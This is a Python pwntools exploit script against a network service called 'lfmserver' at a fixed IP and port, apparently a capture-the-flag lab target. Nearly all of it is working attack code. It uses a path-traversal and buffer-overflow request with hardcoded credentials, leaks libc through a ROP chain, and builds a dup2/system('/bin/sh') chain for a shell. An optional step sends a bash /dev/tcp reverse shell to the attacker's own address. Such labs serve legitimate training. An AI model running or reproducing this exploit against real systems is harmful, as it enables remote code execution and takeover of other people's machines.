#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template lfmserver
from pwn import *

# Set up pwntools for the correct architecture
binary = context.binary = ELF('./lfmserver')
libc = ELF('./libc.so.6',checksec=False)


host, port = "10.10.10.173", 8888
FILE="/proc/sys/kernel/randomize_va_space"


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.LOCAL:
        return remote("127.0.0.1",5000, timeout=3)
    else:
        return remote(host, port, timeout=3)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{binary.entry:x}
set follow-fork-mode child
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT VARS
#===========================================================

#ropper --file lfmserver
pop_rdi = 0x0405c4b #0x0405c4b: pop rdi; ret;
pop_rsi = 0x0405c49 #0x0405c49: pop rsi; pop r15; ret;
nop     = 0x040251f #0x040251f: nop; ret;

#===========================================================
#                    EXPLOIT FUNCTIONS
#===========================================================

# Clear screen
def clear(num=1):
    for i in range(0,num):
        sys.stdout.write("\033[F")
        sys.stdout.write("\033[K")

# Return IP of interface
def get_ip_address(ifname, ipv6=False):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915,
                struct.pack('256s', ifname[:15].encode()))[20:24])

# Generate MD5 of file
def genMD5(file):
    md5 = hashlib.md5()
    md5.update(open(file, "rb").read())
    return md5.hexdigest()

#https://gist.github.com/Paradoxis/6336c2eaea20a591dd36bb1f5e227da2#file-url_encode-py
def urlencode(data, bytes=False):
    if bytes: # Don't use ord if already bytes
        return "".join("%{0:0>2}".format(format(c, "x")) for c in data)
    else:
        return "".join("%{0:0>2}".format(format(ord(c), "x")) for c in data)

# Overflow buffer
def overflow(FILE="/proc/sys/kernel/randomize_va_space"):
    payload = "../../../../../.."# "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e"
    payload = urlencode(payload)
    payload += FILE
    payload += "%x" # Inject invalid character that will write null bytes
    payload += urlencode("A" * 106) #Overflow # "%41" * 106 
    return payload, genMD5(FILE)

# Generate request with payload
def genReq(payload):
    junk, md5 = overflow(FILE)
    request = "CHECK /{JUNK}{PAYLOAD} LFM\r\nUser=lfmserver_user\r\n".format(JUNK=junk,PAYLOAD=urlencode(payload,True))
    request += "Password=!gby0l0r0ck$$!\r\n\r\n{md5}\n".format(md5=md5)
    #log.info("Length of request: %d\n%s" % (len(request),request))
    return request

# Leak libc base
def leak(fd):
    try:
        io = start()
        log.info("Trying fd: %d" % fd)
        rop = ROP([binary])

        # call write(fd, dup2@got, 8);
        rop.raw(pop_rdi)
        rop.raw(fd)
        rop.raw(pop_rsi)
        rop.raw(binary.got['dup2']) # function to leak, can be any function
        rop.raw(0x0) # for r15
        rop.raw(nop)
        # rdx is 8
        rop.raw(binary.symbols['write'])

        io.sendline(genReq(bytes(rop)))
        
        # Recv junk
        io.recvuntil("Size: 32",timeout=3)
        io.recvline(timeout=3)
        io.recvline(timeout=3)
        io.recvline(timeout=3)

        leak = u64(io.recv().rstrip()[1:7].ljust(8, b'\x00'))
        io.close()
        clear(3)

        # Check if leak is plausible
        if leak < libc.symbols['dup2']:
            raise Exception("Leak not plausible!")
        
        libc.address = leak - libc.symbols['dup2']
        clear()
        log.success("Leaked libc-base: %s" % hex(libc.address))
        return True
    except: # Exception as ex:
        #log.warning(ex)
        return False

# Generate ropchain with fd
def genRopchain(fd):
    rop = ROP([binary, libc])

    """ 
    # Duplicate fd to redirect stdin, stdout and stderr to the socket
    # dup2(fd, 0)
    rop.raw(pop_rdi)
    rop.raw(fd) # fd
    rop.raw(pop_rsi)
    rop.raw(0x0)
    rop.raw(0x0) # for r15
    rop.raw(libc.symbols['dup2'])

    # dup2(fd, 1)
    # Don't pop rdi again, because it's already fd
    rop.raw(pop_rsi)
    rop.raw(0x1)
    rop.raw(0x0) # for r15
    rop.raw(libc.symbols['dup2'])

    # dup2(6, 2)
    # Don't pop rdi again, because it's already fd
    rop.raw(pop_rsi)
    rop.raw(0x2)
    rop.raw(0x0) # for r15
    rop.raw(libc.symbols['dup2'])
    """
    
    rop.dup2(fd, 0)
    rop.dup2(fd, 1)
    rop.dup2(fd, 2)

    # system('/bin/sh')
    rop.system(next(libc.search(b"/bin/sh")))
    return bytes(rop)

# Send final payload to get shell
def sendPayload(fd):
    io = start()
    rop = genRopchain(fd)
    io.sendline(genReq(rop))
    return io

# Exploit binary
def exploit():
    try:
        for fd in range(3, 10):
            if leak(fd):
                log.success("Found fd: %d" % fd)
                shell = sendPayload(fd)
                clear(2)
                if args.REV:
                    ip = get_ip_address("tun0")
                    log.info("Setup your listener! [nc -lvnp 443]") 
                    while True:
                        done = input("Send payload? [Y/n] ").rstrip()
                        if done in ["Y","y",""]:
                            clear()
                            shell.sendline("bash -c 'bash -i >& /dev/tcp/{IP}/443 0>&1'".format(IP=ip))
                            log.success("Reverse-shell payload send!")
                            shell.close()
                            clear()
                            break
                        clear()
                    return True
                else:
                    shell.sendline("id")
                    shell.interactive()
                    return True
    except Exception as ex:
        log.warning(ex)
        return False

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

exploit()

"""
while not exploit():
    log.warning("Did not get shell! Retrying...")
    sleep(2) # Wait 2 seconds and retry
"""